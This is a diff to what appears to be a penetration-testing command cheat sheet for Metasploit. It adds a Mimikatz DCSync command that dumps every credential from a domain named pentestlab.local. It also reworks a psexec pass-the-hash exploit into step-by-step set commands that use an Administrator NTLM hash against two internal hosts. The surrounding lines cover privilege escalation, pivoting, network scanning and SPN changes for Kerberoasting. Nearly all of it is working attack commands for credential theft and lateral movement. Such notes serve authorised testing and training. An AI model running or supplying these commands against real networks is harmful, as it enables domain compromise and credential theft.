@@ -409,6 +409,7 @@ getsystem
 cp /root/Tools/Inf/privilege-escalation-awesome-scripts-suite/metasploit/peass.rb /usr/share/metasploit-framework/modules/post/multi/gather/
 reload_all
 load kiwi
+kiwi_cmd "lsadump::dcsync /domain:pentestlab.local /all /csv"
 background
 sessions
 sessions -i 1
@@ -427,4 +428,9 @@ Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get
 run post/multi/manage/autoroute
 run post/multi/manage/autoroute ACTION=delete
 run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
-run exploit/windows/smb/psexec LHOST=10.10.10.3 RHOSTS=10.10.10.1-2 SMBUser=Administrator SMBPass=be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
+use exploit/windows/smb/psexec
+set LHOST 10.10.10.3
+set RHOSTS 10.10.10.1-2
+set SMBUser Administrator
+set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
+run
